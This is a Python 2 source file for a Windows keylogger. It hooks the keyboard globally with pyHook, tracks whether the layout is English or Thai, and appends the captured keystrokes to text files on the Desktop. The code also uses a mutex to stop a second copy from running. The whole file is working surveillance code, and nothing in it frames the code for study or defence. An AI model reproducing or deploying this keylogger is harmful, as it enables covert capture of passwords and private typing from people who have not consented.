#-*-coding: utf-8 -*-
import string
import pyHook
import sys
import os
import logging
import pythoncom #form pywin32
import datetime,time
import win32event, win32api, winerror
import ctypes
from _winreg import *

#Disallowing Multiple Instance
#more : https://msdn.microsoft.com/en-us/library/windows/desktop/ms686927(v=vs.85).aspx

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)


#global variable
data_en=""
data_th=""
#flag setting language 0 = unset [def.] , 1 = en , 2 = th
flag_cl=0

#x=""

#check language and setting flag_cl
def checklanguage():
    global flag_cl
    #get hex current language
    #0x409 is EN
    #0x41e is TH
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2**16 - 1)
    lid_hex = hex(lid)
    print("current hex language",lid_hex)

    if(lid_hex=="0x409"):
        print("setting en")
        flag_cl=1
    elif(lid_hex=="0x41e"):
        print("setting th")
        flag_cl=2
    else:
        print("cannot detect language")
        flag_cl=0


def keypressed(event):
    global data_en
    global data_th
    global flag_cl
    #global x
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    elif event.Ascii==96:
        if(flag_cl==1):
            flag_cl=2
            keys='<CHANGE TH>'
        else:
            flag_cl=1
            keys='<CHANGE EN>'
    elif event.Ascii==113:
        sys.exit()
    else:
        keys=chr(event.Ascii)
        print("ascii:",event.Ascii,"keys:",keys)

    if flag_cl==1:
        data_en=data_en+keys
    elif flag_cl==2:
        data_th=data_th+keys
    else:
        print("flag is not setting>",flag_cl)
        sys.exit()
    #if x==1:  
        #some choice ex.local 
    local()
    #can create another choice----

def local():
    global data_en
    global data_th
    global flag_cl
    print("in local data en:",len(data_en))
    print("in local data th:",len(data_th))
    if ((len(data_en)>10) or (len(data_th)>10)):
        if flag_cl == 1:
            print("write en")
            fp=open("C:\Users\lenovo\Desktop\log_en.txt","a")
            fp.write(data_en)
            fp.write("\n")
            fp.close()
            data_en=""
            
        elif flag_cl == 2: 
            print("write th")
            fp=open("C:\Users\lenovo\Desktop\log_th.txt","a")
            fp.write(data_th)
            fp.write("\n")
            fp.close()
            data_th=""
        else:
            print("flag is have problem..")
    return True

def main():
    print("in main")
    checklanguage()

if __name__ == '__main__':
    main()

print("under main")
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()